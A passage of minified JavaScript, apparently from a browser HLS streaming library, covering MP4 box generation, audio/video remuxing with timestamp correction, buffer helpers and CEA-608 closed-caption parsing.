Uint8Array([0,0,0,0,3,23+t,0,1,0,4,15+t,64,21,0,0,0,0,0,0,0,0,0,0,0,5].concat([t]).concat(e.config).concat([6,1,2]))},e.mp4a=function(t){var r=t.samplerate;return e.box(e.types.mp4a,new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,t.channelCount,0,16,0,0,0,0,r>>8&255,255&r,0,0]),e.box(e.types.esds,e.esds(t)))},e.mp3=function(t){var r=t.samplerate;return e.box(e.types[".mp3"],new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,t.channelCount,0,16,0,0,0,0,r>>8&255,255&r,0,0]))},e.stsd=function(t){return"audio"===t.type?t.isAAC||"mp3"!==t.codec?e.box(e.types.stsd,e.STSD,e.mp4a(t)):e.box(e.types.stsd,e.STSD,e.mp3(t)):e.box(e.types.stsd,e.STSD,e.avc1(t))},e.tkhd=function(t){var r=t.id,n=t.duration*t.timescale,a=t.width,s=t.height,o=Math.floor(n/(i+1)),u=Math.floor(n%(i+1));return e.box(e.types.tkhd,new Uint8Array([1,0,0,7,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,r>>24&255,r>>16&255,r>>8&255,255&r,0,0,0,0,o>>24,o>>16&255,o>>8&255,255&o,u>>24,u>>16&255,u>>8&255,255&u,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,a>>8&255,255&a,0,0,s>>8&255,255&s,0,0]))},e.traf=function(t,r){var n=e.sdtp(t),a=t.id,s=Math.floor(r/(i+1)),o=Math.floor(r%(i+1));return e.box(e.types.traf,e.box(e.types.tfhd,new Uint8Array([0,0,0,0,a>>24,a>>16&255,a>>8&255,255&a])),e.box(e.types.tfdt,new Uint8Array([1,0,0,0,s>>24,s>>16&255,s>>8&255,255&s,o>>24,o>>16&255,o>>8&255,255&o])),e.trun(t,n.length+16+20+8+16+8+8),n)},e.trak=function(t){return t.duration=t.duration||4294967295,e.box(e.types.trak,e.tkhd(t),e.mdia(t))},e.trex=function(t){var r=t.id;return e.box(e.types.trex,new Uint8Array([0,0,0,0,r>>24,r>>16&255,r>>8&255,255&r,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1]))},e.trun=function(t,r){var i,n,a,s,o,u,l=t.samples||[],c=l.length,d=12+16*c,f=new Uint8Array(d);for(r+=8+d,f.set([0,0,15,1,c>>>24&255,c>>>16&255,c>>>8&255,255&c,r>>>24&255,r>>>16&255,r>>>8&255,255&r],0),i=0;i<c;i++)a=(n=l[i]).duration,s=n.size,o=n.flags,u=n.cts,f.set([a>>>24&255,a>>>16&255,a>>>8&255,255&a,s>>>24&255,s>>>16&255,s>>>8&255,255&s,o.isLeading<<2|o.dependsOn,o.isDependedOn<<6|o.hasRedundancy<<4|o.paddingValue<<1|o.isNonSync,61440&o.degradPrio,15&o.degradPrio,u>>>24&255,u>>>16&255,u>>>8&255,255&u],12+16*i);return e.box(e.types.trun,f)},e.initSegment=function(t){e.types||e.init();var r,i=e.moov(t);return(r=new Uint8Array(e.FTYP.byteLength+i.byteLength)).set(e.FTYP),r.set(i,e.FTYP.byteLength),r},e}();t.default=n},"./src/remux/mp4-remuxer.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/remux/aac-helper.js"),n=r("./src/remux/mp4-generator.js"),a=r("./src/events.js"),s=r("./src/errors.js"),o=r("./src/utils/logger.js"),u=function(){function e(e,t,r,i){this.observer=e,this.config=t,this.typeSupported=r;var n=navigator.userAgent;this.isSafari=i&&i.indexOf("Apple")>-1&&n&&!n.match("CriOS"),this.ISGenerated=!1}return e.prototype.destroy=function(){},e.prototype.resetTimeStamp=function(e){this._initPTS=this._initDTS=e},e.prototype.resetInitSegment=function(){this.ISGenerated=!1},e.prototype.remux=function(e,t,r,i,n,s,u){if(this.ISGenerated||this.generateIS(e,t,n),this.ISGenerated){var l=e.samples.length,c=t.samples.length,d=n,f=n;if(l&&c){var h=(e.samples[0].pts-t.samples[0].pts)/t.inputTimeScale;d+=Math.max(0,h),f+=Math.max(0,-h)}if(l){e.timescale||(o.logger.warn("regenerate InitSegment as audio detected"),this.generateIS(e,t,n));var p=this.remuxAudio(e,d,s,u);if(c){var g=void 0;p&&(g=p.endPTS-p.startPTS),t.timescale||(o.logger.warn("regenerate InitSegment as video detected"),this.generateIS(e,t,n)),this.remuxVideo(t,f,s,g,u)}}else if(c){var y=this.remuxVideo(t,f,s,0,u);y&&e.codec&&this.remuxEmptyAudio(e,d,s,y)}}r.samples.length&&this.remuxID3(r,n),i.samples.length&&this.remuxText(i,n),this.observer.trigger(a.default.FRAG_PARSED)},e.prototype.generateIS=function(e,t,r){var i,u,l=this.observer,c=e.samples,d=t.samples,f=this.typeSupported,h="audio/mp4",p={},g={tracks:p},y=void 0===this._initPTS;if(y&&(i=u=1/0),e.config&&c.length&&(e.timescale=e.samplerate,o.logger.log("audio sampling rate : "+e.samplerate),e.isAAC||(f.mpeg?(h="audio/mpeg",e.codec=""):f.mp3&&(e.codec="mp3")),p.audio={container:h,codec:e.codec,initSegment:!e.isAAC&&f.mpeg?new Uint8Array:n.default.initSegment([e]),metadata:{channelCount:e.channelCount}},y&&(i=u=c[0].pts-e.inputTimeScale*r)),t.sps&&t.pps&&d.length){var v=t.inputTimeScale;t.timescale=v,p.video={container:"video/mp4",codec:t.codec,initSegment:n.default.initSegment([t]),metadata:{width:t.width,height:t.height}},y&&(i=Math.min(i,d[0].pts-v*r),u=Math.min(u,d[0].dts-v*r),this.observer.trigger(a.default.INIT_PTS_FOUND,{initPTS:i}))}Object.keys(p).length?(l.trigger(a.default.FRAG_PARSING_INIT_SEGMENT,g),this.ISGenerated=!0,y&&(this._initPTS=i,this._initDTS=u)):l.trigger(a.default.ERROR,{type:s.ErrorTypes.MEDIA_ERROR,details:s.ErrorDetails.FRAG_PARSING_ERROR,fatal:!1,reason:"no audio/video samples found"})},e.prototype.remuxVideo=function(e,t,r,i,u){var l,c,d,f,h,p,g,y=8,v=e.timescale,m=e.samples,L=[],M=m.length,T=this._PTSNormalize,A=this._initPTS,w=this.nextAvcDts,E=this.isSafari;if(0!==M){E&&(r|=m.length&&w&&(u&&Math.abs(t-w/v)<.1||Math.abs(m[0].pts-w-A)<v/5)),r||(w=t*v),m.forEach(function(e){e.pts=T(e.pts-A,w),e.dts=T(e.dts-A,w)}),m.sort(function(e,t){var r=e.dts-t.dts,i=e.pts-t.pts;return r||i||e.id-t.id});var S=m.reduce(function(e,t){return Math.max(Math.min(e,t.pts-t.dts),-18e3)},0);if(S<0){o.logger.warn("PTS < DTS detected in video samples, shifting DTS by "+Math.round(S/90)+" ms to overcome this issue");for(var D=0;D<m.length;D++)m[D].dts+=S}var b=m[0];h=Math.max(b.dts,0),f=Math.max(b.pts,0);var j=Math.round((h-w)/90);r&&j&&(j>1?o.logger.log("AVC:"+j+" ms hole between fragments detected,filling it"):j<-1&&o.logger.log("AVC:"+-j+" ms overlapping between fragments detected"),h=w,m[0].dts=h,f=Math.max(f-j,w),m[0].pts=f,o.logger.log("Video/PTS/DTS adjusted: "+Math.round(f/90)+"/"+Math.round(h/90)+",delta:"+j+" ms")),b=m[m.length-1],g=Math.max(b.dts,0),p=Math.max(b.pts,0,g),E&&(l=Math.round((g-h)/(m.length-1)));var C=0,I=0;for(D=0;D<M;D++){for(var x=m[D],N=x.units,_=N.length,O=0,k=0;k<_;k++)O+=N[k].data.length;I+=O,C+=_,x.length=O,x.dts=E?h+D*l:Math.max(x.dts,h),x.pts=Math.max(x.pts,x.dts)}var R=I+4*C+8;try{c=new Uint8Array(R)}catch(e){return void this.observer.trigger(a.default.ERROR,{type:s.ErrorTypes.MUX_ERROR,details:s.ErrorDetails.REMUX_ALLOC_ERROR,fatal:!1,bytes:R,reason:"fail allocating video mdat "+R})}var P=new DataView(c.buffer);P.setUint32(0,R),c.set(n.default.types.mdat,4);for(D=0;D<M;D++){var F=m[D],B=F.units,U=0,z=void 0;for(k=0,_=B.length;k<_;k++){var G=B[k],Y=G.data,Q=G.data.byteLength;P.setUint32(y,Q),y+=4,c.set(Y,y),y+=Q,U+=4+Q}if(E)z=Math.max(0,l*Math.round((F.pts-F.dts)/l));else{if(D<M-1)l=m[D+1].dts-F.dts;else{var H=this.config,K=F.dts-m[D>0?D-1:D].dts;if(H.stretchShortVideoTrack){var W=H.maxBufferHole,V=Math.floor(W*v),q=(i?f+i*v:this.nextAudioPts)-F.pts;q>V?((l=q-K)<0&&(l=K),o.logger.log("It is approximately "+q/90+" ms to the next segment; using duration "+l/90+" ms for the last video frame.")):l=K}else l=K}z=Math.round(F.pts-F.dts)}L.push({size:U,duration:l,cts:z,flags:{isLeading:0,isDependedOn:0,hasRedundancy:0,degradPrio:0,dependsOn:F.key?2:1,isNonSync:F.key?0:1}})}this.nextAvcDts=g+l;var X=e.dropped;if(e.len=0,e.nbNalu=0,e.dropped=0,L.length&&navigator.userAgent.toLowerCase().indexOf("chrome")>-1){var Z=L[0].flags;Z.dependsOn=2,Z.isNonSync=0}e.samples=L,d=n.default.moof(e.sequenceNumber++,h,e),e.samples=[];var J={data1:d,data2:c,startPTS:f/v,endPTS:(p+l)/v,startDTS:h/v,endDTS:this.nextAvcDts/v,type:"video",hasAudio:!1,hasVideo:!0,nb:L.length,dropped:X};return this.observer.trigger(a.default.FRAG_PARSING_DATA,J),J}},e.prototype.remuxAudio=function(e,t,r,u){var l,c,d,f,h,p,g,y=e.inputTimeScale,v=e.timescale,m=y/v,L=(e.isAAC?1024:1152)*m,M=this._PTSNormalize,T=this._initPTS,A=!e.isAAC&&this.typeSupported.mpeg,w=e.samples,E=[],S=this.nextAudioPts;if(r|=w.length&&S&&(u&&Math.abs(t-S/y)<.1||Math.abs(w[0].pts-S-T)<20*L),w.forEach(function(e){e.pts=e.dts=M(e.pts-T,t*y)}),0!==(w=w.filter(function(e){return e.pts>=0})).length){if(r||(S=u?t*y:w[0].pts),e.isAAC)for(var D=this.config.maxAudioFramesDrift,b=0,j=S;b<w.length;){var C,I=w[b];C=(F=I.pts)-j;var x=Math.abs(1e3*C/y);if(C<=-D*L)o.logger.warn("Dropping 1 audio frame @ "+(j/y).toFixed(3)+"s due to "+Math.round(x)+" ms overlap."),w.splice(b,1),e.len-=I.unit.length;else if(C>=D*L&&x<1e4&&j){var N=Math.round(C/L);o.logger.warn("Injecting "+N+" audio frame @ "+(j/y).toFixed(3)+"s due to "+Math.round(1e3*C/y)+" ms gap.");for(var _=0;_<N;_++){var O=Math.max(j,0);(d=i.default.getSilentFrame(e.manifestCodec||e.codec,e.channelCount))||(o.logger.log("Unable to get silent frame for given audio codec; duplicating last frame instead."),d=I.unit.subarray()),w.splice(b,0,{unit:d,pts:O,dts:O}),e.len+=d.length,j+=L,b++}I.pts=I.dts=j,j+=L,b++}else Math.abs(C),I.pts=I.dts=j,j+=L,b++}_=0;for(var k=w.length;_<k;_++){var R=w[_],P=R.unit,F=R.pts;if(void 0!==g)c.duration=Math.round((F-g)/m);else{var B=Math.round(1e3*(F-S)/y),U=0;if(r&&e.isAAC&&B){if(B>0&&B<1e4)U=Math.round((F-S)/L),o.logger.log(B+" ms hole between AAC samples detected,filling it"),U>0&&((d=i.default.getSilentFrame(e.manifestCodec||e.codec,e.channelCount))||(d=P.subarray()),e.len+=U*d.length);else if(B<-12){o.logger.log("drop overlapping AAC sample, expected/parsed/delta:"+(S/y).toFixed(3)+"s/"+(F/y).toFixed(3)+"s/"+-B+"ms"),e.len-=P.byteLength;continue}F=S}if(p=F,!(e.len>0))return;var z=A?e.len:e.len+8;l=A?0:8;try{f=new Uint8Array(z)}catch(e){return void this.observer.trigger(a.default.ERROR,{type:s.ErrorTypes.MUX_ERROR,details:s.ErrorDetails.REMUX_ALLOC_ERROR,fatal:!1,bytes:z,reason:"fail allocating audio mdat "+z})}A||(new DataView(f.buffer).setUint32(0,z),f.set(n.default.types.mdat,4));for(b=0;b<U;b++)(d=i.default.getSilentFrame(e.manifestCodec||e.codec,e.channelCount))||(o.logger.log("Unable to get silent frame for given audio codec; duplicating this frame instead."),d=P.subarray()),f.set(d,l),l+=d.byteLength,c={size:d.byteLength,cts:0,duration:1024,flags:{isLeading:0,isDependedOn:0,hasRedundancy:0,degradPrio:0,dependsOn:1}},E.push(c)}f.set(P,l);var G=P.byteLength;l+=G,c={size:G,cts:0,duration:0,flags:{isLeading:0,isDependedOn:0,hasRedundancy:0,degradPrio:0,dependsOn:1}},E.push(c),g=F}var Y=0,Q=E.length;if(Q>=2&&(Y=E[Q-2].duration,c.duration=Y),Q){this.nextAudioPts=S=g+m*Y,e.len=0,e.samples=E,h=A?new Uint8Array:n.default.moof(e.sequenceNumber++,p/m,e),e.samples=[];var H=p/y,K=S/y,W={data1:h,data2:f,startPTS:H,endPTS:K,startDTS:H,endDTS:K,type:"audio",hasAudio:!0,hasVideo:!1,nb:Q};return this.observer.trigger(a.default.FRAG_PARSING_DATA,W),W}return null}},e.prototype.remuxEmptyAudio=function(e,t,r,n){var a=e.inputTimeScale,s=a/(e.samplerate?e.samplerate:a),u=this.nextAudioPts,l=(void 0!==u?u:n.startDTS*a)+this._initDTS,c=n.endDTS*a+this._initDTS,d=1024*s,f=Math.ceil((c-l)/d),h=i.default.getSilentFrame(e.manifestCodec||e.codec,e.channelCount);if(o.logger.warn("remux empty Audio"),h){for(var p=[],g=0;g<f;g++){var y=l+g*d;p.push({unit:h,pts:y,dts:y}),e.len+=h.length}e.samples=p,this.remuxAudio(e,t,r)}else o.logger.trace("Unable to remuxEmptyAudio since we were unable to get a silent frame for given audio codec!")},e.prototype.remuxID3=function(e){var t,r=e.samples.length,i=e.inputTimeScale,n=this._initPTS,s=this._initDTS;if(r){for(var o=0;o<r;o++)(t=e.samples[o]).pts=(t.pts-n)/i,t.dts=(t.dts-s)/i;this.observer.trigger(a.default.FRAG_PARSING_METADATA,{samples:e.samples})}e.samples=[]},e.prototype.remuxText=function(e){e.samples.sort(function(e,t){return e.pts-t.pts});var t,r=e.samples.length,i=e.inputTimeScale,n=this._initPTS;if(r){for(var s=0;s<r;s++)(t=e.samples[s]).pts=(t.pts-n)/i;this.observer.trigger(a.default.FRAG_PARSING_USERDATA,{samples:e.samples})}e.samples=[]},e.prototype._PTSNormalize=function(e,t){var r;if(void 0===t)return e;for(r=t<e?-8589934592:8589934592;Math.abs(e-t)>4294967296;)e+=r;return e},e}();t.default=u},"./src/remux/passthrough-remuxer.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/events.js"),n=function(){function e(e){this.observer=e}return e.prototype.destroy=function(){},e.prototype.resetTimeStamp=function(){},e.prototype.resetInitSegment=function(){},e.prototype.remux=function(e,t,r,n,a,s,o,u){var l=this.observer,c="";e&&(c+="audio"),t&&(c+="video"),l.trigger(i.default.FRAG_PARSING_DATA,{data1:u,startPTS:a,startDTS:a,type:c,hasAudio:!!e,hasVideo:!!t,nb:1,dropped:0}),l.trigger(i.default.FRAG_PARSED)},e}();t.default=n},"./src/task-loop.js":function(e,t,r){"use strict";var i,n=this&&this.__extends||(i=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(e,t){e.__proto__=t}||function(e,t){for(var r in t)t.hasOwnProperty(r)&&(e[r]=t[r])},function(e,t){function r(){this.constructor=e}i(e,t),e.prototype=null===t?Object.create(t):(r.prototype=t.prototype,new r)});Object.defineProperty(t,"__esModule",{value:!0});var a=function(e){function t(t){for(var r=[],i=1;i<arguments.length;i++)r[i-1]=arguments[i];var n=e.apply(this,[t].concat(r))||this;return n._tickInterval=null,n._tickTimer=null,n._tickCallCount=0,n._boundTick=n.tick.bind(n),n}return n(t,e),t.prototype.onHandlerDestroying=function(){this.clearNextTick(),this.clearInterval()},t.prototype.hasInterval=function(){return!!this._tickInterval},t.prototype.hasNextTick=function(){return!!this._tickTimer},t.prototype.setInterval=function(e){return!this._tickInterval&&(this._tickInterval=setInterval(this._boundTick,e),!0)},t.prototype.clearInterval=function(){return!!this._tickInterval&&(clearInterval(this._tickInterval),this._tickInterval=null,!0)},t.prototype.clearNextTick=function(){return!!this._tickTimer&&(clearTimeout(this._tickTimer),this._tickTimer=null,!0)},t.prototype.tick=function(){this._tickCallCount++,1===this._tickCallCount&&(this.doTick(),this._tickCallCount>1&&(this.clearNextTick(),this._tickTimer=setTimeout(this._boundTick,0)),this._tickCallCount=0)},t.prototype.doTick=function(){},t}(r("./src/event-handler.js").default);t.default=a},"./src/utils/attr-list.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var r=/^(\d+)x(\d+)$/,i=/\s*(.+?)\s*=((?:\".*?\")|.*?)(?:,|$)/g,n=function(){function t(e){for(var r in"string"==typeof e&&(e=t.parseAttrList(e)),e)e.hasOwnProperty(r)&&(this[r]=e[r])}return t.prototype.decimalInteger=function(t){var r=parseInt(this[t],10);return r>e.MAX_SAFE_INTEGER?1/0:r},t.prototype.hexadecimalInteger=function(e){if(this[e]){var t=(this[e]||"0x").slice(2);t=(1&t.length?"0":"")+t;for(var r=new Uint8Array(t.length/2),i=0;i<t.length/2;i++)r[i]=parseInt(t.slice(2*i,2*i+2),16);return r}return null},t.prototype.hexadecimalIntegerAsNumber=function(t){var r=parseInt(this[t],16);return r>e.MAX_SAFE_INTEGER?1/0:r},t.prototype.decimalFloatingPoint=function(e){return parseFloat(this[e])},t.prototype.enumeratedString=function(e){return this[e]},t.prototype.decimalResolution=function(e){var t=r.exec(this[e]);if(null!==t)return{width:parseInt(t[1],10),height:parseInt(t[2],10)}},t.parseAttrList=function(e){var t,r={};for(i.lastIndex=0;null!==(t=i.exec(e));){var n=t[2];0===n.indexOf('"')&&n.lastIndexOf('"')===n.length-1&&(n=n.slice(1,-1)),r[t[1]]=n}return r},t}();t.default=n}).call(this,r("./src/polyfills/number.js").Number)},"./src/utils/binary-search.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});t.default={search:function(e,t){for(var r=0,i=e.length-1,n=null,a=null;r<=i;){var s=t(a=e[n=(r+i)/2|0]);if(s>0)r=n+1;else{if(!(s<0))return a;i=n-1}}return null}}},"./src/utils/buffer-helper.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(){}return e.isBuffered=function(e,t){try{if(e)for(var r=e.buffered,i=0;i<r.length;i++)if(t>=r.start(i)&&t<=r.end(i))return!0}catch(e){}return!1},e.bufferInfo=function(e,t,r){try{if(e){var i=e.buffered,n=[],a=void 0;for(a=0;a<i.length;a++)n.push({start:i.start(a),end:i.end(a)});return this.bufferedInfo(n,t,r)}}catch(e){}return{len:0,start:t,end:t,nextStart:void 0}},e.bufferedInfo=function(e,t,r){var i,n,a,s,o,u=[];for(e.sort(function(e,t){var r=e.start-t.start;return r||t.end-e.end}),o=0;o<e.length;o++){var l=u.length;if(l){var c=u[l-1].end;e[o].start-c<r?e[o].end>c&&(u[l-1].end=e[o].end):u.push(e[o])}else u.push(e[o])}for(o=0,i=0,n=a=t;o<u.length;o++){var d=u[o].start,f=u[o].end;if(t+r>=d&&t<f)n=d,i=(a=f)-t;else if(t+r<d){s=d;break}}return{len:i,start:n,end:a,nextStart:s}},e}();t.BufferHelper=i},"./src/utils/cea-608-parser.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i={42:225,92:233,94:237,95:243,96:250,123:231,124:247,125:209,126:241,127:9608,128:174,129:176,130:189,131:191,132:8482,133:162,134:163,135:9834,136:224,137:32,138:232,139:226,140:234,141:238,142:244,143:251,144:193,145:201,146:211,147:218,148:220,149:252,150:8216,151:161,152:42,153:8217,154:9473,155:169,156:8480,157:8226,158:8220,159:8221,160:192,161:194,162:199,163:200,164:202,165:203,166:235,167:206,168:207,169:239,170:212,171:217,172:249,173:219,174:171,175:187,176:195,177:227,178:205,179:204,180:236,181:210,182:242,183:213,184:245,185:123,186:125,187:92,188:94,189:95,190:124,191:8764,192:196,193:228,194:214,195:246,196:223,197:165,198:164,199:9475,200:197,201:229,202:216,203:248,204:9487,205:9491,206:9495,207:9499},n=function(e){var t=e;return i.hasOwnProperty(e)&&(t=i[e]),String.fromCharCode(t)},a=15,s=100,o={17:1,18:3,21:5,22:7,23:9,16:11,19:12,20:14},u={17:2,18:4,21:6,22:8,23:10,19:13,20:15},l={25:1,26:3,29:5,30:7,31:9,24:11,27:12,28:14},c={25:2,26:4,29:6,30:8,31:10,27:13,28:15},d=["white","green","blue","cyan","red","yellow","magenta","black","transparent"],f={verboseFilter:{DATA:3,DEBUG:3,INFO:2,WARNING:2,TEXT:1,ERROR:0},time:null,verboseLevel:0,setTime:function(e){this.time=e},log:function(e,t){this.verboseFilter[e];this.verboseLevel}},h=function(e){for(var t=[],r=0;r<e.length;r++)t.push(e[r].toString(16));return t},p=function(){function e(e,t,r,i,n){this.foreground=e||"white",this.underline=t||!1,this.italics=r||!1,this.background=i||"black",this.flash=n||!1}return e.prototype.reset=function(){this.foreground="white",this.underline=!1,this.italics=!1,this.background="black",this.flash=!1},e.prototype.setStyles=function(e){for(var t=["foreground","underline","italics","background","flash"],r=0;r<t.length;r++){var i=t[r];e.hasOwnProperty(i)&&(this[i]=e[i])}},e.prototype.isDefault=function(){return"white"===this.foreground&&!this.underline&&!this.italics&&"black"===this.background&&!this.flash},e.prototype.equals=function(e){return this.foreground===e.foreground&&this.underline===e.underline&&this.italics===e.italics&&this.background===e.background&&this.flash===e.flash},e.prototype.copy=function(e){this.foreground=e.foreground,this.underline=e.underline,this.italics=e.italics,this.background=e.background,this.flash=e.flash},e.prototype.toString=function(){return"color="+this.foreground+", underline="+this.underline+", italics="+this.italics+", background="+this.background+", flash="+this.flash},e}(),g=function(){function e(e,t,r,i,n,a){this.uchar=e||" ",this.penState=new p(t,r,i,n,a)}return e.prototype.reset=function(){this.uchar=" ",this.penState.reset()},e.prototype.setChar=function(e,t){this.uchar=e,this.penState.copy(t)},e.prototype.setPenState=function(e){this.penState.copy(e)},e.prototype.equals=function(e){return this.uchar===e.uchar&&this.penState.equals(e.penState)},e.prototype.copy=function(e){this.uchar=e.uchar,this.penState.copy(e.penState)},e.prototype.isEmpty=function(){return" "===this.uchar&&this.penState.isDefault()},e}(),y=function(){function e(){this.chars=[];for(var e=0;e<s;e++)this.chars.push(new g);this.pos=0,this.currPenState=new p}return e.prototype.equals=function(e){for(var t=!0,r=0;r<s;r++)if(!this.chars[r].equals(e.chars[r])){t=!1;break}return t},e.prototype.copy=function(e){for(var t=0;t<s;t++)this.chars[t].copy(e.chars[t])},e.prototype.isEmpty=function(){for(var e=!0,t=0;t<s;t++)if(!this.chars[t].isEmpty()){e=!1;break}return e},e.prototype.setCursor=function(e){this.pos!==e&&(this.pos=e),this.pos<0?(f.log("ERROR","Negative cursor position "+this.pos),this.pos=0):this.pos>s&&(f.log("ERROR","Too large cursor position "+this.pos),this.pos=s)},e.prototype.moveCursor=function(e){var t=this.pos+e;if(e>1)for(var r=this.pos+1;r<t+1;r++)this.chars[r].setPenState(this.currPenState);this.setCursor(t)},e.prototype.backSpace=function(){this.moveCursor(-1),this.chars[this.pos].setChar(" ",this.currPenState)},e.prototype.insertChar=function(e){e>=144&&this.backSpace();var t=n(e);this.pos>=s?f.log("ERROR","Cannot insert "+e.toString(16)+" ("+t+") at position "+this.pos+". Skipping it!"):(this.chars[this.pos].setChar(t,this.currPenState),this.moveCursor(1))},e.prototype.clearFromPos=function(e){var t;for(t=e;t<s;t++)this.chars[t].reset()},e.prototype.clear=function(){this.clearFromPos(0),this.pos=0,this.currPenState.reset()},e.prototype.clearToEndOfRow=function(){this.clearFromPos(this.pos)},e.prototype.getTextString=function(){for(var e=[],t=!0,r=0;r<s;r++){var i=this.chars[r].uchar;" "!==i&&(t=!1),e.push(i)}return t?"":e.join("")},e.prototype.setPenStyles=function(e){this.currPenState.setStyles(e),this.chars[this.pos].setPenState(this.currPenState)},e}(),v=function(){function e(){this.rows=[];for(var e=0;e<a;e++)this.rows.push(new y);this.currRow=a-1,this.nrRollUpRows=null,this.reset()}return e.prototype.reset=function(){for(var e=0;e<a;e++)this.rows[e].clear();this.currRow=a-1},e.prototype.equals=function(e){for(var t=!0,r=0;r<a;r++)if(!this.rows[r].equals(e.rows[r])){t=!1;break}return t},e.prototype.copy=function(e){for(var t=0;t<a;t++)this.rows[t].copy(e.rows[t])},e.prototype.isEmpty=function(){for(var e=!0,t=0;t<a;t++)if(!this.rows[t].isEmpty()){e=!1;break}return e},e.prototype.backSpace=function(){this.rows[this.currRow].backSpace()},e.prototype.clearToEndOfRow=function(){this.rows[this.currRow].clearToEndOfRow()},e.prototype.insertChar=function(e){this.rows[this.currRow].insertChar(e)},e.prototype.setPen=function(e){this.rows[this.currRow].setPenStyles(e)},e.prototype.moveCursor=function(e){this.rows[this.currRow].moveCursor(e)},e.prototype.setCursor=function(e){f.log("INFO","setCursor: "+e),this.rows[this.currRow].setCursor(e)},e.prototype.setPAC=function(e){f.log("INFO","pacData = "+JSON.stringify(e));var t=e.row-1;if(this.nrRollUpRows&&t<this.nrRollUpRows-1&&(t=this.nrRollUpRows-1),this.nrRollUpRows&&this.currRow!==t){for(var r=0;r<a;r++)this.rows[r].clear();var i=this.currRow+1-this.nrRollUpRows,n=this.lastOutputScreen;if(n){var s=n.rows[i].cueStartTime;if(s&&s<f.time)for(r=0;r<this.nrRollUpRows;r++)this.rows[t-this.nrRollUpRows+r+1].copy(n.rows[i+r])}}this.currRow=t;var o=this.rows[this.currRow];if(null!==e.indent){var u=e.indent,l=Math.max(u-1,0);o.setCursor(e.indent),e.color=o.chars[l].penState.foreground}var c={foreground:e.color,underline:e.underline,italics:e.italics,background:"black",flash:!1};this.setPen(c)},e.prototype.setBkgData=function(e){f.log("INFO","bkgData = "+JSON.stringify(e)),this.backSpace(),this.setPen(e),this.insertChar(32)},e.prototype.setRollUpRows=function(e){this.nrRollUpRows=e},e.prototype.rollUp=function(){if(null!==this.nrRollUpRows){f.log("TEXT",this.getDisplayText());var e=this.currRow+1-this.nrRollUpRows,t=this.rows.splice(e,1)[0];t.clear(),this.rows.splice(this.currRow,0,t),f.log("INFO","Rolling up")}else f.log("DEBUG","roll_up but nrRollUpRows not set yet")},e.prototype.getDisplayText=function(e){e=e||!1;for(var t=[],r="",i=-1,n=0;n<a;n++){var s=this.rows[n].getTextString();s&&(i=n+1,e?t.push("Row "+i+": '"+s+"'"):t.push(s.trim()))}return t.length>0&&(r=e?"["+t.join(" | ")+"]":t.join("\n")),r},e.prototype.getTextAndFormat=function(){return this.rows},e}(),m=function(){function e(e,t){this.chNr=e,this.outputFilter=t,this.mode=null,this.verbose=0,this.displayedMemory=new v,this.nonDisplayedMemory=new v,this.lastOutputScreen=new v,this.currRollUpRow=this.displayedMemory.rows[a-1],this.writeScreen=this.displayedMemory,this.mode=null,this.cueStartTime=null}return e.prototype.reset=function(){this.mode=null,this.displayedMemory.reset(),this.nonDisplayedMemory.reset(),this.lastOutputScreen.reset(),this.currRollUpRow=this.displayedMemory.rows[a-1],this.writeScreen=this.displayedMemory,this.mode=null,this.cueStartTime=null,this.lastCueEndTime=null},e.prototype.getHandler=function(){return this.outputFilter},e.prototype.setHandler=function(e){this.outputFilter=e},e.prototype.setPAC=function(e){this.writeScreen.setPAC(e)},e.prototype.setBkgData=function(e){this.writeScreen.setBkgData(e)},e.prototype.setMode=function(e){e!==this.mode&&(this.mode=e,f.log("INFO","MODE="+e),"MODE_POP-ON"===this.mode?this.writeScreen=this.nonDisplayedMemory:(this.writeScreen=this.displayedMemory,this.writeScreen.reset()),"MODE_ROLL-UP"!==this.mode&&(this.displayedMemory.nrRollUpRows=null,this.nonDisplayedMemory.nrRollUpRows=null),this.mode=e)},e.prototype.insertChars=function(e){for(var t=0;t<e.length;t++)this.writeScreen.insertChar(e[t]);var r=this.writeScreen===this.displayedMemory?"DISP":"NON_DISP";f.log("INFO",r+": "+this.writeScreen.getDisplayText(!0)),"MODE_PAINT-ON"!==this.mode&&"MODE_ROLL-UP"!==this.mode||(f.log("TEXT","DISPLAYED: "+this.displayedMemory.getDisplayText(!0)),this.outputDataUpdate())},e.prototype.ccRCL=function(){f.log("INFO","RCL - Resume Caption Loading"),this.setMode("MODE_POP-ON")},e.prototype.ccBS=function(){f.log("INFO","BS - BackSpace"),"MODE_TEXT"!==this.mode&&(this.writeScreen.backSpace(),this.writeScreen===this.displayedMemory&&this.outputDataUpdate())},e.prototype.ccAOF=function(){},e.prototype.ccAON=function(){},e.prototype.ccDER=function(){f.log("INFO","DER- Delete to End of Row"),this.writeScreen.clearToEndOfRow(),this.outputDataUpdate()},e.prototype.ccRU=function(e){f.log("INFO","RU("+e+") - Roll Up"),this.writeScreen=this.displayedMemory,this.setMode("MODE_ROLL-UP"),this.writeScreen.setRollUpRows(e)},e.prototype.ccFON=function(){f.log("INFO","FON - Flash On"),this.writeScreen.setPen({flash:!0})},e.prototype.ccRDC=function(){f.log("INFO","RDC - Resume Direct Captioning"),this.setMode("MODE_PAINT-ON")},e.prototype.ccTR=function(){f.log("INFO","TR"),this.setMode("MODE_TEXT")},e.prototype.ccRTD=function(){f.log("INFO","RTD"),this.setMode("MODE_TEXT")},e.prototype.ccEDM=function(){f.log("INFO","EDM - Erase Displayed Memory"),this.displayedMemory.reset(),this.outputDataUpdate(!0)},e.prototype.ccCR=function(){f.log("CR - Carriage Return"),this.writeScreen.rollUp(),this.outputDataUpdate(!0)},e.prototype.ccENM=function(){f.log("INFO","ENM - Erase Non-displayed 